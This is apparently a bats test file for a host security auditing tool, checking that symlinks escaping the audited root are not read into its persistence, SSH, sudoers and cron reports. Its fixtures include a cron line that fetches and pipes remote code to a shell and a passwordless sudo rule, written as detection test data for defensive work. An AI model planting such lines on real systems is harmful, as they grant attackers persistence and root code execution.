#!/usr/bin/env bats
load ../helpers
setup() { src; reset_state; make_root; _PM=none; }

# A live-host secret the fixture "image" must never be able to make us read.
setup_outside_target() {
  OUTSIDE="$(mktemp)"
  echo 'LIVE-HOST-SECRET-CONTENT' > "$OUTSIDE"
}
teardown_outside_target() { [ -n "${OUTSIDE:-}" ] && rm -f "$OUTSIDE"; }

# note: `! emitted ...` is NOT a valid negative assertion in bats — bash's
# errexit exempts commands negated with '!' from triggering failure, so such
# a line always "passes" regardless of what emitted returns. Use `run` and
# check $status instead.
not_emitted() { run emitted "$1" "$2"; [ "$status" -ne 0 ]; }

@test "_within_revelio_root accepts a plain file inside the root" {
  echo x > "$ROOT/etc/pam.d/sshd"
  _within_revelio_root "$ROOT/etc/pam.d/sshd"
}

@test "_within_revelio_root rejects a symlink escaping the root" {
  setup_outside_target
  ln -s "$OUTSIDE" "$ROOT/etc/pam.d/evil"
  run _within_revelio_root "$ROOT/etc/pam.d/evil"
  [ "$status" -ne 0 ]
  teardown_outside_target
}

@test "pam.d symlink escaping REVELIO_ROOT is not read into the report" {
  setup_outside_target
  ln -s "$OUTSIDE" "$ROOT/etc/pam.d/evil"
  check_persistence
  not_emitted attention "LIVE-HOST-SECRET-CONTENT"
  [[ " ${_BLINDSPOTS[*]:-} " == *"symlink"* ]]
  teardown_outside_target
}

@test "authorized_keys reached via a symlink escaping REVELIO_ROOT is not read" {
  setup_outside_target
  echo 'ssh-ed25519 AAAA... live-host@laptop' > "$OUTSIDE"
  ln -s "$OUTSIDE" "$ROOT/root/.ssh/authorized_keys"
  check_ssh
  not_emitted attention "live-host@laptop"
  teardown_outside_target
}

@test "sudoers file reached via a symlink escaping REVELIO_ROOT is not read" {
  setup_outside_target
  echo 'alice ALL=(ALL) NOPASSWD: ALL' > "$OUTSIDE"
  mkdir -p "$ROOT/etc/sudoers.d"
  ln -s "$OUTSIDE" "$ROOT/etc/sudoers.d/evil"
  check_accounts
  not_emitted attention "NOPASSWD"
  teardown_outside_target
}

@test "cron.d file reached via a symlink escaping REVELIO_ROOT is not read" {
  setup_outside_target
  echo '* * * * * root curl http://x/y | sh' > "$OUTSIDE"
  ln -s "$OUTSIDE" "$ROOT/etc/cron.d/evil"
  check_scheduled
  not_emitted attention "fetch-exec"
  teardown_outside_target
}

@test "clean fixture (no symlinks) still reports normally" {
  echo 'auth optional pam_exec.so /opt/x.sh' > "$ROOT/etc/pam.d/sshd"
  check_persistence
  emitted attention "pam_exec"
}
